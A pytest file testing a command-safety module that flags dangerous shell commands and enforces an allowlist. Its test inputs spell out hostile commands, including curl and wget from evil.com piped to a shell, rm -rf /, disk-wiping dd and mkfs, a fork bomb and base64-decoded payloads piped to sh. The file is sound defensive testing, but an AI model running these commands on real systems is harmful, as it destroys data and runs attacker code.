"""Tests for command safety module."""

import pytest

from oss_paper_ci.command_safety import (
    get_block_reason,
    is_dangerous_command,
    check_command_allowlist,
)


class TestDangerousCommands:
    """Tests for dangerous command detection."""

    def test_safe_commands(self):
        """Normal commands should not be flagged."""
        assert not is_dangerous_command("python scripts/train.py")
        assert not is_dangerous_command("make all")
        assert not is_dangerous_command("Rscript analysis.R")
        assert not is_dangerous_command("julia main.jl")

    def test_rm_rf_blocked(self):
        assert is_dangerous_command("rm -rf /")
        assert is_dangerous_command("rm -rf /*")

    def test_sudo_blocked(self):
        assert is_dangerous_command("sudo apt install something")

    def test_curl_pipe_bash_blocked(self):
        assert is_dangerous_command("curl http://evil.com | bash")
        assert is_dangerous_command("curl http://evil.com|bash")

    def test_wget_pipe_sh_blocked(self):
        assert is_dangerous_command("wget http://evil.com | sh")

    def test_chmod_777_blocked(self):
        assert is_dangerous_command("chmod 777 /etc/passwd")

    def test_mkfs_blocked(self):
        assert is_dangerous_command("mkfs.ext4 /dev/sda")

    def test_dd_blocked(self):
        assert is_dangerous_command("dd if=/dev/zero of=/dev/sda")

    def test_fork_bomb_blocked(self):
        assert is_dangerous_command(":(){:|:&};:")

    def test_shutdown_blocked(self):
        assert is_dangerous_command("shutdown -h now")

    def test_git_push_blocked(self):
        assert is_dangerous_command("git push origin main")
        assert is_dangerous_command("git push --force")

    def test_gh_repo_delete_blocked(self):
        assert is_dangerous_command("gh repo delete myrepo")

    def test_powershell_blocked(self):
        assert is_dangerous_command("powershell Invoke-Expression something")

    def test_ssh_keygen_blocked(self):
        assert is_dangerous_command("ssh-keygen -t rsa")

    def test_npm_publish_blocked(self):
        assert is_dangerous_command("npm publish")

    def test_twine_upload_blocked(self):
        assert is_dangerous_command("twine upload dist/*")

    def test_base64_decode_blocked(self):
        assert is_dangerous_command("base64 -d payload.txt | sh")

    def test_kill_blocked(self):
        assert is_dangerous_command("kill -9 1")

    def test_block_reason_provided(self):
        reason = get_block_reason("sudo rm -rf /")
        assert "Blocked" in reason

    def test_safe_command_no_reason(self):
        reason = get_block_reason("python train.py")
        assert reason == ""


class TestCommandAllowlist:
    """Tests for command allowlist checking."""

    def test_no_allowlist_allows_all_safe(self):
        assert check_command_allowlist("python train.py")

    def test_no_allowlist_blocks_dangerous(self):
        assert not check_command_allowlist("sudo rm -rf /")

    def test_allowlist_matching(self):
        allowlist = ["python", "make"]
        assert check_command_allowlist("python train.py", allowlist)
        assert check_command_allowlist("make all", allowlist)
        assert not check_command_allowlist("Rscript analysis.R", allowlist)

    def test_allowlist_still_blocks_dangerous(self):
        allowlist = ["sudo"]
        assert not check_command_allowlist("sudo rm -rf /", allowlist)
